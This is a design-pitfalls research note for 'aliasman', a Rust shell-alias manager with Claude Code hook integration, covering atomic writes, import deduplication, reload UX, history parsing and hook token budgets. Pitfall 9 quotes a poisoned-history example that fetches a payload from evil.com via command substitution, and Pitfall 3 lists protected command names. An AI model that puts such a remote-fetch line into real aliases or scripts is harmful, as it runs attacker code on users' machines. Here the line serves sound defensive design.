# Domain Pitfalls: aliasman

**Domain:** Rust CLI for shell alias management with Claude Code hook integration
**Researched:** 2026-05-10
**Confidence:** MEDIUM-HIGH (zsh/hook internals verified against official sources; some items rely on accumulated engineering knowledge)

---

## Critical Pitfalls

Mistakes in this tier cause data loss, silent corruption, or force rewrites.

---

### Pitfall 1: Non-atomic Shell Config File Writes

**What goes wrong:**
Any tool that opens a shell config file (`.zshrc`, `.bashrc`, `~/.aliases`), reads it, modifies it in memory, and writes the whole file back is exposed to a race window. If the process is interrupted — power loss, SIGKILL, disk full — the file is truncated or partially written. The user's shell config is now corrupted and their next terminal open fails silently or with a parse error.

**Why it happens:**
Developers use `std::fs::write()` directly on the target path. This is the single most common mistake in CLI tools that touch dotfiles.

**Consequences:**
- User loses entire `.zshrc` content — aliases, PATH, exports, everything
- Error surfaces only on the next shell open, not during the write, creating a confusing delay
- No backup means no recovery path

**Prevention:**
Use the `tempfile` crate's `NamedTempFile::persist()` pattern exclusively. Write to a temp file in the same directory (same filesystem, so rename is atomic), then call `persist()` which does an atomic `rename(2)`. The official `tempfile` docs confirm: "Atomically moves the temporary file to a permanent location, replacing any existing file at the target path." — [tempfile crate, stebalien/tempfile]

```rust
let mut tmp = NamedTempFile::new_in(config_dir)?;
write!(tmp, "{}", new_content)?;
tmp.flush()?;
tmp.persist(target_path)?; // atomic rename, never partial
```

Also take a backup (`~/.aliases.bak`) before any write. Offer `aliasman restore` as a safety command.

**Warning signs:**
- Any use of `std::fs::write(path, content)` directly on `.zshrc` or `~/.aliases`
- Write operations without an intermediate temp file

**Detection:**
Code review: grep for `fs::write` calls that target config paths without an intermediate `NamedTempFile`.

**Phase that must address it:** Phase 1 — the very first file write operation. No exceptions.

---

### Pitfall 2: First-Run Import Deduplication Failure

**What goes wrong:**
On first run, aliasman scans the user's existing `.zshrc`/`.bashrc` and imports all found `alias foo=...` lines into `~/.aliases`. It also adds `source ~/.aliases` to the shell config. If the user runs `aliasman init` a second time (or if detection logic runs again on subsequent `add` commands), the import logic does not correctly detect that these aliases already exist in `~/.aliases`. The result: every alias gets duplicated. In pathological cases across ten runs, the file balloons and `source ~/.aliases` takes seconds to evaluate.

**Why it happens:**
Developers implement "does alias exist?" checks against the in-memory parse but not against the canonical file on disk. Or they check by name but not by value, so `alias gs='git status'` and `alias gs='git status'` pass as different because the quote style differs.

**Consequences:**
- `~/.aliases` fills with hundreds of duplicate lines
- Shell startup slows measurably
- Duplicate definitions create unpredictable which-definition-wins behavior (last-wins in zsh)
- Hardest to debug because the bug is silent

**Prevention:**
- Parse `~/.aliases` at the start of every write operation and build a name-keyed map before merging
- Normalize alias values before comparison: strip surrounding quotes, trim whitespace, canonicalize single vs double quote style
- Make `aliasman init` idempotent: running it N times must produce the same result as running it once
- Add an integration test that runs `init` twice and asserts `~/.aliases` content is identical both times
- Before adding `source ~/.aliases` to the shell config, grep the config for the exact line — do not add it if already present

**Warning signs:**
- "Import" logic that appends without a read-first dedup pass
- Any test suite that only tests `init` once

**Detection:**
Run `aliasman init && aliasman init` and diff the resulting `~/.aliases`. They must be byte-identical.

**Phase that must address it:** Phase 1 (first-run import). Must be explicit in the design before a line of code is written.

---

### Pitfall 3: Alias Name Shadows System Commands

**What goes wrong:**
A user aliases `rm` to `rm -i` for safety. Or they alias `ls` to `ls -la`. Or, worse, they alias `git` to something. Some of these are intentional — many are accidents when history-based suggestion is too aggressive. The critical case: if aliasman auto-suggests an alias that shadows a command the user did not intend to override, the user loses access to the expected behavior of that command. An alias that shadows `sudo` or `cd` can be terminal.

**Why it happens:**
History-suggestion logic finds that a user runs `ls -la` 400 times and confidently suggests `alias ls='ls -la'` without checking whether `ls` is a known system binary.

**Consequences:**
- Silent behavioral change: `ls` now always adds `-la` without the user knowing why
- Shadowing `rm`, `mv`, `cp`, `sudo`, `kill`, `chmod` can cause irreversible data damage
- Claude Code hook might inject an alias that overrides something Claude itself calls internally

**Prevention:**
Maintain a hardcoded blocklist of protected names that cannot be used as alias targets without an explicit `--force` flag:

```
PROTECTED: rm, mv, cp, ln, chmod, chown, kill, sudo, su, cd, source, exec,
           eval, export, unset, exit, logout, git, ssh, curl, wget, brew
```

When the user attempts to create an alias whose name is in the protected list, print a clear warning and require `aliasman add --name rm --command "rm -i" --force` to proceed.

For history-based suggestions, never suggest aliases that would shadow protected names.

**Warning signs:**
- No validation step before writing a new alias
- History suggestion code that produces alias names without checking against a blocklist

**Detection:**
Attempt `aliasman add --name rm --command "rm -rf"` and verify it is rejected without `--force`.

**Phase that must address it:** Phase 1 (alias CRUD) and Phase 3 (history suggestion). Both surfaces can create the problem.

---

## Moderate Pitfalls

Mistakes here cause user frustration, UX failures, or hard-to-debug state problems. They do not typically cause data loss but do cause support burden.

---

### Pitfall 4: Shell Reload UX — The "Why Isn't My Alias Working?" Problem

**What goes wrong:**
User runs `aliasman add --name gs --command "git status"`. aliasman confirms success. User immediately types `gs` in the same terminal. Gets `command not found: gs`. The alias exists in `~/.aliases` but the current shell session has not re-sourced it.

This is the number-one UX failure point for any alias management tool. Users hit it on the first use and it feels like a bug.

**Why it happens:**
Shell config changes are only visible to new shell processes or after an explicit `source ~/.aliases`. The tool cannot source files into the parent process from a child process — this is a fundamental Unix process isolation constraint.

**Consequences:**
- Users feel the tool is broken
- Support requests / issues pile up
- Users who don't understand shell sessions give up

**Prevention:**
Always print an actionable reload instruction immediately after any mutation:

```
Alias 'gs' added. Run this to use it now:
  source ~/.aliases

Or open a new terminal tab.
```

Consider printing the `eval`-able command so a power user can do:
```bash
$(aliasman add --name gs --command "git status" --emit-source)
```

This is the `direnv`/`nvm` model — the tool emits a shell expression that the user's shell evaluates. Implementing a shell function wrapper (e.g., `function aliasman { ... }`) can make this seamless, but that is a v2 concern.

**Warning signs:**
- Success messages with no mention of shell reload
- No documentation on the session-vs-file distinction

**Detection:**
First-use walkthrough: add an alias, attempt to use it in the same session, observe output.

**Phase that must address it:** Phase 1. Every mutation command must include the reload hint.

---

### Pitfall 5: zsh Extended History Format Parsing Failures

**What goes wrong:**
When `EXTENDED_HISTORY` is enabled in zsh (it is on by default in Oh My Zsh and most modern configs), every history line is prefixed with a timestamp and duration in the format `: <epoch>:<duration>;<command>`. A naive history parser that splits on newlines or assumes one-command-per-line will:
- Parse timestamps as commands
- Miss multi-line commands (commands containing embedded newlines are stored with `\n` escaped as `\\n` in extended format)
- Choke on binary characters from terminal escape sequences that leaked into history
- Fail on extremely large history files (users with SAVEHIST=100000 have multi-MB files)

Official zsh docs confirm the format: `': ' <beginning time> ':' <elapsed seconds> ';' <command>` — [zsh sourceforge, Options, 16.2.4]

**Why it happens:**
Developers test with small, clean history files. Production history files have years of cruft.

**Consequences:**
- History suggestion produces garbage alias names from timestamps
- Parser crashes on binary chars, producing a runtime panic or silent empty result
- Large files cause slow suggestion generation

**Prevention:**
- Detect extended history format by checking first line pattern `^: [0-9]+:[0-9]+;`
- Skip lines that match the timestamp prefix pattern when extracting commands
- Treat the `;` separator as the command start, not line start
- Limit history file read to a configurable maximum (default: last 10,000 lines)
- Use `BufReader` in Rust for streaming reads — never load entire history into memory
- Handle `invalid UTF-8` errors gracefully: use `read_to_end` → `from_utf8_lossy` rather than `read_to_string`

**Warning signs:**
- History parsing that uses `lines()` on a `String::read_to_string()` call without a lossy conversion
- No test fixtures with extended history format data

**Detection:**
Test with a real `~/.zsh_history` file from a developer machine with EXTENDED_HISTORY enabled.

**Phase that must address it:** Phase 3 (history suggestion). Cannot be retrofitted cheaply.

---

### Pitfall 6: Claude Code Hook Token Injection Overload

**What goes wrong:**
The Claude Code hook fires on `SessionStart` and injects alias context via stdout. If the hook dumps every alias in `~/.aliases` regardless of relevance, it consumes context tokens on every session. A user with 200 aliases, each with a descriptive comment, could inject 2,000–4,000 tokens per session. Multiplied across long sessions and sub-agents, this pushes toward the compaction boundary faster.

Claude Code auto-compacts at approximately 95% context window capacity (confirmed: `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE` documents this threshold — disler/claude-code-hooks-mastery). There is no documented hard limit on hook stdout size, but injecting large context that is not used hurts response quality and token cost.

**Why it happens:**
The naive implementation does `cat ~/.aliases` in the hook script. Works fine at 10 aliases; degrades at 100.

**Consequences:**
- Token waste on every session: 2–4K tokens injected but only 3 aliases used
- Faster context compaction, losing conversation history
- Slower first response (more tokens to process)
- User cost impact on pay-per-token Claude plans

**Prevention:**
The hook must filter aliases by relevance to the current directory. The `cwd` field is provided in the `SessionStart` hook input schema — [disler/claude-code-hooks-mastery]:

```json
{
  "hook_event_name": "SessionStart",
  "cwd": "/Users/foo/open_source/my-rust-project"
}
```

Filtering heuristic: inject aliases whose commands mention tools relevant to the current directory's ecosystem. If `cwd` contains `Cargo.toml`, inject `cargo`-related aliases. If it contains `package.json`, inject `npm`/`yarn` aliases. Untagged generic aliases (`gs='git status'`) are always injected since git is universal.

Cap injection at a hard token budget (e.g., 500 tokens / ~2000 characters). Log what was injected vs what was filtered for debug mode.

**Warning signs:**
- Hook script contains `cat ~/.aliases` with no filtering
- No test measuring token count of hook output

**Detection:**
Create 100 test aliases across different domains. Run hook from a Rust project directory. Measure output character count.

**Phase that must address it:** Phase 4 (Claude Code hook). This is the core design constraint of the hook phase — do not start it without a filtering design.

---

### Pitfall 7: Cross-Shell Alias Syntax Incompatibility

**What goes wrong:**
The `~/.aliases` file is managed by aliasman and sourced by both zsh and bash. Alias syntax that works in one does not always work in the other:

- zsh supports global aliases (`alias -g L='| less'`) — bash does not
- zsh parameter substitution in alias values uses different syntax than bash for edge cases
- zsh allows certain tokens as alias names that bash rejects
- `alias foo=bar` (no quotes) works in both, but `alias foo='bar baz'` with embedded single quotes requires escaping that differs by shell
- The official zsh docs note: "When `POSIX_ALIASES` is set, only plain unquoted strings are eligible for aliasing" — [zsh sourceforge, 6.8]

**Why it happens:**
Development and testing happens exclusively in zsh (macOS default since Catalina). Bash users hit bugs.

**Consequences:**
- bash users get parse errors sourcing `~/.aliases` if aliasman wrote zsh-specific syntax
- `source ~/.bashrc` fails silently or with obscure errors
- Users blame the tool, not the syntax difference

**Prevention:**
For v1, explicitly scope to POSIX-compatible alias syntax only. This means:
- No global aliases (`-g` flag) — store these separately or refuse them
- No zsh-specific array syntax in alias values
- Quote all alias values with single quotes consistently: `alias name='value'`
- Validate that the alias value string can be represented in single-quoted form (no embedded single quotes without escaping)
- Document: "aliasman generates POSIX-compatible alias syntax for compatibility across bash and zsh"

PowerShell is confirmed out of scope for v1 per PROJECT.md. Do not add any PowerShell detection logic — it is a different paradigm (`Set-Alias`, function-based, no single-file approach).

**Warning signs:**
- Any use of `alias -g` in generated output
- No bash-sourcing integration test

**Detection:**
Generate `~/.aliases` with aliasman, then source it explicitly in `bash --norc` and verify no errors.

**Phase that must address it:** Phase 1 (alias storage format). The format is a foundation decision.

---

## Minor Pitfalls

Issues that cause friction but are recoverable without data loss.

---

### Pitfall 8: Homebrew Formula Maintenance Overhead

**What goes wrong:**
Every aliasman release requires manually computing the SHA256 of the release tarball, updating the formula URL and hash, running `brew audit --strict --online`, and submitting to the tap. Developers underestimate this and either ship broken formulas or stop maintaining Homebrew as a distribution channel.

Common failure mode: SHA256 in formula doesn't match the tarball (GitHub regenerates tarballs in rare cases, changing the hash). `brew install` fails with a checksum error and the user gets no useful guidance.

Homebrew docs confirm: `bump-formula-pr` can auto-determine SHA256 if not provided, but this only helps for homebrew/core submissions — a private tap requires manual management [homebrew/brew, Manpage].

**Prevention:**
- Automate formula updates via GitHub Actions: on release tag, compute SHA256 of release asset and open a PR to the tap repo
- Use `brew bump-formula-pr` in CI where possible
- Add a formula test block that runs `aliasman --version` so `brew test` catches broken installs
- Keep formula in a separate `homebrew-aliasman` tap repo from day one — do not mix it with the main repo

**Warning signs:**
- Formula SHA256 hard-coded in a file with no automation to update it
- No `test do` block in the formula

**Phase that must address it:** Phase 5 or whichever phase covers distribution. Not a blocker for v1 core functionality — but must be addressed before any public release.

---

### Pitfall 9: History-Suggested Command Injection Risk

**What goes wrong:**
aliasman reads shell history to suggest aliases. If the history contains commands with shell metacharacters, an attacker who can write to the user's history file (local threat model: another user on a shared machine, or a compromised process) could inject a command that becomes an alias with arbitrary shell expansion.

Specific risk: a history entry like `echo "$(curl http://evil.com/payload)"` getting suggested as an alias value. When the alias is later executed, it runs the command substitution.

**Why it happens:**
Shell history is treated as trusted input, but it is a file on disk with no integrity protection.

**Consequences:**
- On multi-user systems or shared dev machines: privilege escalation via poisoned history
- On single-user machines: low practical risk, but still bad practice

**Prevention:**
- Treat all history-derived strings as untrusted input
- When suggesting an alias from history, display the full command value to the user before creating it — never auto-create an alias from history without explicit user confirmation
- Validate alias values against a allowlist of safe characters or a blocklist of dangerous patterns before storing
- Do not execute alias values during validation — parse only, never `eval`
- Flag suggestions that contain command substitution (`$(...)`, backticks), process substitution (`<(...)`), or pipeline operators as "review carefully" in the suggestion output

**Warning signs:**
- History suggestion that creates aliases without user confirmation
- No sanitization of alias values before storage

**Phase that must address it:** Phase 3 (history suggestion). Confirmation step is mandatory.

---

### Pitfall 10: Large History File Performance

**What goes wrong:**
Users with `SAVEHIST=100000` have history files that can be several megabytes. Loading the entire file into memory for frequency analysis causes noticeable lag on the first `aliasman suggest` invocation.

**Prevention:**
- Use streaming reads with `BufReader` — process line by line, do not buffer entire file
- Process only the most recent N lines (configurable, default 10,000)
- Use a frequency map with a bounded heap for top-N extraction (O(n log k) not O(n log n))
- Cache frequency results in `~/.config/aliasman/history_cache.json` with a last-modified timestamp check

**Phase that must address it:** Phase 3 (history analysis). Do not implement a naive `read_to_string` approach.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Phase 1: Alias CRUD + file write | Non-atomic write corrupts `~/.aliases` | `NamedTempFile::persist()` from day one |
| Phase 1: First-run import | Deduplication failure on second run | Idempotency test: run init twice, assert identical output |
| Phase 1: Shell reload UX | Users think tool is broken | Mandatory reload hint on every mutation |
| Phase 1: Alias name validation | Shadowing system commands | Blocklist + `--force` flag required |
| Phase 1: Cross-shell syntax | Bash users get parse errors | POSIX-only alias format, no `-g` global aliases |
| Phase 3: History parsing | Binary chars, extended format, large files | Streaming BufReader, lossy UTF-8, extended format detection |
| Phase 3: Security | History injection into alias values | Explicit user confirmation before any auto-create |
| Phase 4: Claude Code hook | Token overload on every session | Directory-aware filtering, 500-token cap, cwd-based heuristic |
| Phase 5: Distribution | SHA256 mismatch, broken Homebrew formula | GitHub Actions automation for formula bumps |

---

## Sources

- zsh official documentation, alias section 6.8 and 6.8.1: https://zsh.sourceforge.io/Doc/Release/Shell-Grammar
- zsh history options (EXTENDED_HISTORY, HIST_SAVE_BY_COPY): https://zsh.sourceforge.io/Doc/Release/Options
- zsh fc builtin and history file format: https://zsh.sourceforge.io/Doc/Release/Shell-Builtin-Commands
- tempfile crate (NamedTempFile::persist, atomic writes): Context7 /stebalien/tempfile — HIGH confidence
- Claude Code hooks docs (SessionStart, UserPromptSubmit, token budget, auto-compaction at 95%): Context7 /disler/claude-code-hooks-mastery — HIGH confidence
- Claude Code hooks (PreToolUse/PostToolUse output schema): Context7 /gowaylee/cchooks — HIGH confidence
- Homebrew formula audit and bump-formula-pr: Context7 /homebrew/brew — HIGH confidence
- mastering-zsh (alias escape, global substitution pitfalls): Context7 /rothgar/mastering-zsh — HIGH confidence
